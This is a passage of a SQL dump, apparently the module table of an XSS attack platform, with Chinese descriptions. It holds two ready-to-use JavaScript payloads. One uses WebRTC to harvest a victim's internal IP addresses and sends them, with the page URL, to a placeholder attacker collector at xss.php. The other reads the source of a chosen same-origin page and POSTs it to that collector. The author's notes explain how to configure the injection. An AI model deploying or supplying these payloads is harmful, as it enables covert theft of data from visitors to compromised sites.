pc.onicecandidate = function(ice) {\r\n\r\n        //skip non-candidate events\r\n        if (ice.candidate) handleCandidate(ice.candidate.candidate);\r\n    };\r\n\r\n    //create a bogus data channel\r\n    pc.createDataChannel(&quot;&quot;);\r\n\r\n    //create an offer sdp\r\n    pc.createOffer(function(result) {\r\n\r\n        //trigger the stun server request\r\n        pc.setLocalDescription(result,\r\n        function() {},\r\n        function() {});\r\n\r\n    },\r\n    function() {});\r\n\r\n    //wait for a while to let everything done\r\n    setTimeout(function() {\r\n        //read candidate info from local description\r\n        var lines = pc.localDescription.sdp.split(&#039;\\n&#039;);\r\n\r\n        lines.forEach(function(line) {\r\n            if (line.indexOf(&#039;a=candidate:&#039;) === 0) handleCandidate(line);\r\n        });\r\n    },\r\n    1000);\r\n}\r\n\r\n//Test: Print the IP addresses into the console\r\ngetIPs(function(ip) { (new Image()).src = &#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&amp;location=&#039; + escape((function() {\r\n        try {\r\n            return document.location.href\r\n        } catch(e) {\r\n            return &#039;&#039;\r\n        }\r\n    })()) + &#039;&amp;ip=&#039; + ip;\r\n});', 0, 1, '参考https://diafygi.github.io/webrtc-ips/', 1, 1, 'admin', 1474706245),
(31, 1, 'post指定页面源码读取', '["mycode"]', '["filename"]', 'var u = &#039;http://替换成你的域名/xss.php?do=api&amp;id={projectId}&#039;;\r\nvar cr;\r\nif (document.charset) {\r\n    cr = document.charset\r\n} else if (document.characterSet) {\r\n    cr = document.characterSet\r\n};\r\nfunction createXmlHttp() {\r\n    if (window.XMLHttpRequest) {\r\n        xmlHttp = new XMLHttpRequest()\r\n    } else {\r\n        var MSXML = new Array(&#039;MSXML2.XMLHTTP.5.0&#039;, &#039;MSXML2.XMLHTTP.4.0&#039;, &#039;MSXML2.XMLHTTP.3.0&#039;, &#039;MSXML2.XMLHTTP&#039;, &#039;Microsoft.XMLHTTP&#039;);\r\n        for (var n = 0; n &lt; MSXML.length; n++) {\r\n            try {\r\n                xmlHttp = new ActiveXObject(MSXML[n]);\r\n                break\r\n            } catch(e) {}\r\n        }\r\n    }\r\n}\r\ncreateXmlHttp();\r\nxmlHttp.onreadystatechange = writeSource;\r\nxmlHttp.open(&quot;GET&quot;, &quot;{set.filename}&quot;, true);\r\nxmlHttp.send(null);\r\nfunction postSource(cc) {\r\n    createXmlHttp();\r\n    url = u;\r\n    cc = &quot;mycode=&quot; + cc;\r\n    xmlHttp.open(&quot;POST&quot;, url, true);\r\n    xmlHttp.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);\r\n    xmlHttp.setRequestHeader(&quot;Content-length&quot;, cc.length);\r\n    xmlHttp.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;);\r\n    xmlHttp.send(cc)\r\n}\r\nfunction writeSource() {\r\n    if (xmlHttp.readyState == 4) {\r\n        var c = new postSource(xmlHttp.responseText)\r\n    }\r\n}', 0, 1, 'post这种方式比较好，比GET好。\r\n\r\nfilename：本人解释一下，你需要读取的URL地址。必须要跟你XSS插入的是同一个域名哦。\r\n\r\n', 1, 1, 'admin', 1474710099);

-- --------------------------------------------------------